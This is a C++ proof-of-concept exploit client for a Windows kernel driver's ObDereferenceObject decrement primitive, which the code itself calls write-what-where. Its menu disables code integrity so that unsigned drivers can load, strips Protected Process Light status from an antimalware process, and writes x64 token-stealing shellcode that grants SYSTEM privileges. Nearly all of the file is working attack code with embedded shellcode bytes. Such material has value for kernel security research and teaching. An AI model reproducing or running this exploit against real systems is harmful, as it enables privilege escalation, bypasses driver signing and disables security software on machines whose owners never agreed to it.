/*
* This code is licensed under the MIT license (MIT).
* Copyright © 2018  Vyacheslav Rusakoff (@swwwolf)
*/

#include <windows.h>
#include <winternl.h>
#include <intsafe.h>

#include <iostream>

#include "./stdafx.h"
#include "./obderef.h"
#include "../include/control.h"

HANDLE open_device() {
    std::cout << "[+] " __FUNCTION__ << std::endl;

    return CreateFile(DOS_DEVICE_NAME,
                      GENERIC_ALL,
                      FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                      nullptr,
                      OPEN_EXISTING,
                      0,
                      nullptr);
}

bool dereference_object(const HANDLE driver, const uintptr_t object, const bool verbose = true) {
    if ( verbose ) {
        std::cout << "[+] " __FUNCTION__ << std::endl;
    }

    OBDEREF_CONTROL_STRUCT control_struct = { 0 };
    control_struct.object = object;

    if ( verbose ) {
        std::cout << "[+] object: " << std::hex << std::showbase << control_struct.object << std::endl;
    }

    uint32_t bytes_ret = 0;
    auto result = !!DeviceIoControl(driver,
                                    IOCTL_OBDEREF_EXECUTE,
                                    &control_struct,
                                    sizeof(control_struct),
                                    nullptr,
                                    0,
                                    reinterpret_cast<LPDWORD>(&bytes_ret),
                                    nullptr);

    return result;
}

bool leak_payload(const HANDLE driver, uintptr_t* address) {
    std::cout << "[+] " __FUNCTION__ << std::endl;

    uint32_t bytes_ret = 0;
    auto result = !!DeviceIoControl(driver,
                                    IOCTL_OBDEREF_LEAK_PAYLOAD,
                                    nullptr,
                                    0,
                                    address,
                                    sizeof(*address),
                                    reinterpret_cast<LPDWORD>(&bytes_ret),
                                    nullptr);

    return result;
}

// https://msdn.microsoft.com/ru-ru/library/windows/desktop/ms724509(v=vs.85).aspx
bool print_code_integrity() {
    std::cout << "[+] " __FUNCTION__ << std::endl;

    SYSTEM_CODEINTEGRITY_INFORMATION info = { 0 };
    info.Length = sizeof(info);

    ULONG ret_len = 0;
    NTSTATUS status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(SystemCodeIntegrityInformation),
                                               &info,
                                               sizeof(info),
                                               &ret_len);

    if ( !NT_SUCCESS(status) ) {
        std::cout << "[-] NtQuerySystemInformation failed!" << std::endl;
        return false;
    }

    std::cout << "[+] CodeIntegrityOptions : " << std::hex << std::showbase << info.CodeIntegrityOptions << std::endl;
    return true;
}

// http://j00ru.vexillium.org/?p=1393
void disable_ci(const HANDLE driver) {
    std::cout << "[+] " __FUNCTION__ << std::endl;
    print_code_integrity();

    std::cout << "[*] Enter address of ci!g_CiOptions (in hex): ";

    uintptr_t address = 0;
    std::cin >> std::hex >> address;

    std::cout << "[*] Enter value of ci!g_CiOptions (in hex): ";

    uintptr_t value = 0;
    std::cin >> std::hex >> value;

    std::cout << "[+] Disabling code integrity with the help of ObDereferenceObject" << std::endl;

    for ( uintptr_t i = 0; i < value - 1; i++ ) {
        dereference_object(driver, OBJECT_TO_OBJECT_HEADER_ADD(address));
    }

    std::cout << "[+] Disabled" << std::endl;
    std::cout << "[+] Load your unsigned driver ASAP and restore ci!g_CiOptions" << std::endl;
    print_code_integrity();
}

/*
Alex Ionescu "Breaking protected processes"

http://www.nosuchcon.org/talks/2014/D3_05_Alex_ionescu_Breaking_protected_processes.pdf

kd> dt nt!_PS_PROTECTED_TYPE
   PsProtectedTypeNone = 0n0
   PsProtectedTypeProtectedLight = 0n1
   PsProtectedTypeProtected = 0n2
   PsProtectedTypeMax = 0n3

kd> dt nt!_PS_PROTECTED_SIGNER
   PsProtectedSignerNone = 0n0
   PsProtectedSignerAuthenticode = 0n1
   PsProtectedSignerCodeGen = 0n2
   PsProtectedSignerAntimalware = 0n3
   PsProtectedSignerLsa = 0n4
   PsProtectedSignerWindows = 0n5
   PsProtectedSignerWinTcb = 0n6
   PsProtectedSignerWinSystem = 0n7
   PsProtectedSignerApp = 0n8
   PsProtectedSignerMax = 0n9

kd> dt nt!_PS_PROTECTION
   +0x000 Level            : UChar
   +0x000 Type             : Pos 0, 3 Bits
   +0x000 Audit            : Pos 3, 1 Bit
   +0x000 Signer           : Pos 4, 4 Bits

Before:

kd> dt nt!_EPROCESS ffffc88e809195c0 Protection.
   +0x6ca Protection  : 
      +0x000 Level       : 0x31 '1'
      +0x000 Type        : 0y001        // PsProtectedTypeProtectedLight
      +0x000 Audit       : 0y0          // false
      +0x000 Signer      : 0y0011       // PsProtectedSignerAntimalware

After:

kd> dt nt!_EPROCESS ffffc88e809195c0 Protection.
   +0x6ca Protection  : 
      +0x000 Level       : 0x1 ''
      +0x000 Type        : 0y001        // PsProtectedTypeProtectedLight
      +0x000 Audit       : 0y0          // false
      +0x000 Signer      : 0y0000       // PsProtectedSignerNone (!!!)
*/
void attack_ppl(const HANDLE driver) {
    std::cout << "[+] " __FUNCTION__ << std::endl;
    std::cout << "[*] Enter EPROCESS address (in hex): ";

    uintptr_t address = 0;
    std::cin >> std::hex >> address;

    std::cout << "[*] Enter Protection value (0x31 for AM PPL) (in hex): ";

    uintptr_t value = 0;
    std::cin >> std::hex >> value;

    std::cout << "[+] Attacking PPL process with the help of ObDereferenceObject" << std::endl;

    for ( uintptr_t i = 0; i < value - 1; i++ ) {
        dereference_object(driver, OBJECT_TO_OBJECT_HEADER_ADD(EPROCESS_TO_PROTECTION(address)));
    }

    std::cout << "[+] Try to kill the process and/or access it threads" << std::endl;
}

/*
    Dereference filled memory. It is kinda of Write-What-Where vulnerability.
    No, you can't use this technique with zeros (0x00, 0x00, 0x00 ...).
    No, you can't use this technique with FFs (0xFF, 0xFF, 0xFF ...).
    Maximum predefined values: INT32_MAX/INT64_MAX
    Shell code must be aligned to sizeof(uintptr_t).

    Stolen shell code:
    https://github.com/Cn33liz/HSEVD-StackOverflowX64/blob/master/HS-StackOverflowX64/HS-StackOverflowX64.c  

    Be careful and do not decrement shell code to 0x00! Choose shell code wisely - adapt.
*/
void write_payload(const HANDLE driver) {
    std::cout << "[+] " __FUNCTION__ << std::endl;
    std::cout << "[+] Leaking payload address" << std::endl;

    uintptr_t address = 0;
    auto result = leak_payload(driver, &address);

    if ( !result ) {
        std::cout << "[-] Failed to leak payload address!" << std::endl;
        return;
    }

    std::cout << "[+] Payload address: " << std::hex << std::showbase << address << std::endl;

    uint8_t shell_code[] =
        "\x65\x48\x8B\x14\x25\x88\x01\x00\x00"  // mov rdx, [gs:188h]   ; Get _ETHREAD pointer from KPCR
        "\x4C\x8B\x82\xB8\x00\x00\x00"          // mov r8, [rdx + b8h]  ; _EPROCESS (kd> u PsGetCurrentProcess)
        "\x4D\x8B\x88\xe8\x02\x00\x00"          // mov r9, [r8 + 2e8h]  ; ActiveProcessLinks list head
        "\x49\x8B\x09"                          // mov rcx, [r9]        ; Follow link to first process in list
        // find_system_proc:
        "\x48\x8B\x51\xF8"                      /* mov rdx, [rcx - 8]   ; Offset from ActiveProcessLinks to
                                                                          UniqueProcessId */
        "\x34\x00"                              // xor al, 0            ; make shell code compatible
        "\x48\x83\xFA\x04"                      // cmp rdx, 4           ; Process with ID 4 is System process
        "\x74\x07"                              // jz found_system      ; Found SYSTEM token
        "\x34\x00"                              // xor al, 0            ; make shell code compatible
        "\x48\x8B\x09"                          // mov rcx, [rcx]       ; Follow _LIST_ENTRY Flink pointer
        "\xEB\xED"                              // jmp find_system_proc ; Loop
        // found_system:
        "\x48\x8B\x41\x70"                      // mov rax, [rcx + 70h] ; Offset from ActiveProcessLinks to Token
        "\x24\xF0"                              // and al, 0f0h         ; Clear low 4 bits of _EX_FAST_REF structure
        "\x49\x89\x80\x58\x03\x00\x00"          // mov [r8 + 358h], rax ; Copy SYSTEM token to current process's token
        // recover:
        "\x90\x90"                              // nop                  ; Recover by yourself
        "\x90\x90\x90"                          // nop                  ; Recover by yourself
        "\x48\x31\xC0"                          // xor rax, rax         ; NTSTATUS Status = STATUS_SUCCESS
        "\xc3"                                  // ret                  ; Return to the base :)
        "\x00\x00\x00\x00"                      // N/A                  ; make shell code compatible
        ;

    std::cout << "[+] Checking shell code compatibility" << std::endl;

    const size_t count = sizeof(shell_code) / sizeof(uintptr_t);
    bool supported = true;

    for ( size_t i = 0; i < count; i++ ) {
        const auto check = *(reinterpret_cast<uintptr_t*>(shell_code) + i);
        std::cout << "[+] Checking shell code part: " << std::hex << std::showbase << check << std::endl;

        uintptr_t sub_result = 0;
        const auto check_result = ULongLongSub(static_cast<uintptr_t>(INT64_MAX), check, &sub_result);

        if ( FAILED(check_result) ) {
            std::cout << "[-] Failed!" << std::endl;
            supported = false;
        } else {
            std::cout << "[+] Succeeded!" << std::endl;
        }
    }

    if ( !supported ) {
        std::cout << "[-] Shell code incompatible!" << std::endl;
        return;
    } else {
        std::cout << "[+] Shell code compatible!" << std::endl;
    }

    // Look for g_Payload in driver
    uint64_t shell_code_predefined[] = {
        0x18825148b5000,
        0xb8828b5000,
        0x49000002e8889000,
        0x34f8518b481000,
        0x34077404fa9000,
        0x418b48edeb099000,
        0x358808949f03000,
        0x4890909090901000,
        0xc40000
    };

    for ( size_t i = 0; i < count; i++ ) {
        const auto shell_code_part = *(reinterpret_cast<uintptr_t*>(shell_code) + i);
        const auto rounds = static_cast<uintptr_t>(shell_code_predefined[i]) - shell_code_part;

        std::cout << "[+] Stage: " << std::dec << i << std::endl;
        std::cout << "[+] Shell code part: " << std::hex << std::showbase << shell_code_part << std::endl;
        std::cout << "[+] Decrement rounds: " << std::hex << std::showbase << rounds << std::endl;

        for ( uintptr_t j = 0; j < rounds; j++ ) {
            dereference_object(driver, OBJECT_TO_OBJECT_HEADER_ADD(reinterpret_cast<uintptr_t*>(address) + i), false);
        }
    }

    std::cout << "[+] Payload address: " << std::hex << std::showbase << address << std::endl;
    std::cout << "[+] Your payload is ready! Check it in debugger." << std::endl;
}

int main() {
    std::cout << "--------------------------------------------------------------------------------" << std::endl;
    std::cout << "[+] ObDereferenceObject vulnerability PoC" << std::endl;
    std::cout << "[+] Author  : Vyacheslav Rusakoff, 2018" << std::endl;
    std::cout << "[+] Twitter : https://twitter.com/swwwolf" << std::endl;
    std::cout << "[+] Blog    : https://sww-it.ru" << std::endl;
    std::cout << "--------------------------------------------------------------------------------" << std::endl;

    auto driver = open_device();

    if ( driver == INVALID_HANDLE_VALUE ) {
        std::cout << "[-] Failed to open device object" << std::endl;
        return 1;
    }

    std::cout << "--------------------------------------------------------------------------------" << std::endl;
    std::cout << "[0]: Disable Code Integrity" << std::endl;
    std::cout << "[1]: Attack Protected Process (PPL)" << std::endl;
    std::cout << "[2]: Write payload shellcode" << std::endl;
    std::cout << "--------------------------------------------------------------------------------" << std::endl;
    std::cout << std::endl;

    std::cout << "[*] Your choice: ";

    int choice = 0;
    std::cin >> choice;

    switch ( choice ) {
        case 0:
        {
            disable_ci(driver);
            break;
        }

        case 1:
        {
            attack_ppl(driver);
            break;
        }

        case 2:
        {
            write_payload(driver);
            break;
        }

        default:
        {
            std::cout << "[-] Unknown choice" << std::endl;
            break;
        }
    }

    CloseHandle(driver);
    return 0;
}
